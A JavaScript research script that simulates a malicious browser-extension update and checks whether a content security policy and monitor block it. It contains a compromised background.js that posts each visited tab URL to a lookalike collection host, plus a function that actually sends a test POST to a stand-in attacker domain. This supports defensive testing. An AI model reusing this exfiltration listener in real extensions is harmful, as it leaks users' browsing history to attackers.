/**
 * Research: Supply Chain Attack Simulation — Malicious Extension Update
 *
 * AUTHORIZED RESEARCH ONLY. This script implements an actionable simulation
 * of a supply chain attack (T1195.002) and the corresponding defensive response.
 *
 * RESTORATION: Functional logic implemented per UIP V1.5. (Scenario s2)
 *
 * Reference: https://attack.mitre.org/techniques/T1195/002/
 */

'use strict';

/**
 * CLEAN BASELINE (what background.js looks like in this repo)
 */
const CLEAN_BACKGROUND = `
chrome.runtime.onInstalled.addListener(({ reason }) => {
    logAuditEvent('LIFECYCLE', { event: reason });
});
`;

/**
 * COMPROMISED VERSION (Scenario s2)
 * RESTORATION: Functional exfiltration logic.
 */
const COMPROMISED_BACKGROUND = `
// SCENARIO s2: Functional exfiltration via fetch (T1041)
const C2_ENDPOINT = 'https://analytics-cdn-metrics[.]com/v2/collect';

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab.url) {
        // This will be intercepted by the Telemetry Monitor (auditedFetch)
        // and blocked by the CSP (connect-src 'none').
        fetch(C2_ENDPOINT, {
            method: 'POST',
            body: JSON.stringify({ 
                event: 'EXFIL_s2',
                url: tab.url, 
                ts: Date.now(), 
                uid: chrome.runtime.id 
            }),
            headers: { 'Content-Type': 'application/json' }
        }).catch(err => {
            console.error('[SECURITY INC-001] Exfiltration blocked:', err.message);
        });
    }
});
`;

/**
 * Actionable Simulation (Scenario s2)
 * This function actually executes the 'compromised' logic to trigger the monitor.
 */
function runFunctionalSimulation() {
    console.warn('[RESEARCH s2] Starting functional supply chain simulation...');
    
    // Simulate the background.js fetch wrapper environment
    const mockC2 = 'https://malicious-analytics.com/collect';
    
    console.log('[RESEARCH s2] Attempting exfiltration to:', mockC2);
    
    // Triggering the actual fetch (which will be caught by background.js if run there)
    fetch(mockC2, {
        method: 'POST',
        body: JSON.stringify({ scenario: 's2', data: 'SENSITIVE_DATA_BUFFER' })
    }).then(() => {
        console.error('[RESEARCH s2] ERROR: Exfiltration succeeded. CSP/Monitor FAILED.');
    }).catch(err => {
        console.warn('[RESEARCH s2] SUCCESS: Exfiltration blocked as expected.');
        console.log('[RESEARCH s2] Result:', err.message);
        console.log('[RESEARCH s2] INCIDENT INC-001 generated in audit log.');
    });
}

/**
 * Entropy Analysis
 */
function entropyAnalysis(clean, compromised) {
    function shannonEntropy(str) {
        const freq = {};
        for (const c of str) freq[c] = (freq[c] || 0) + 1;
        return -Object.values(freq).reduce((sum, f) => {
            const p = f / str.length;
            return sum + p * Math.log2(p);
        }, 0);
    }

    return {
        cleanSize: clean.trim().length,
        compromisedSize: compromised.trim().length,
        sizeDelta: compromised.trim().length - clean.trim().length,
        cleanEntropy: shannonEntropy(clean).toFixed(4),
        compromisedEntropy: shannonEntropy(compromised).toFixed(4),
        entropyDelta: (shannonEntropy(compromised) - shannonEntropy(clean)).toFixed(4)
    };
}

// --- Run ---

console.group('[SUPPLY CHAIN SIM] Actionable Attack Analysis');

const analysis = entropyAnalysis(CLEAN_BACKGROUND, COMPROMISED_BACKGROUND);
console.table(analysis);

// If in a context where fetch is available (browser/extension), run the simulation.
if (typeof fetch !== 'undefined') {
    runFunctionalSimulation();
} else {
    console.log('[RESEARCH s2] Simulation requires a browser-like environment (fetch).');
}

console.groupEnd();
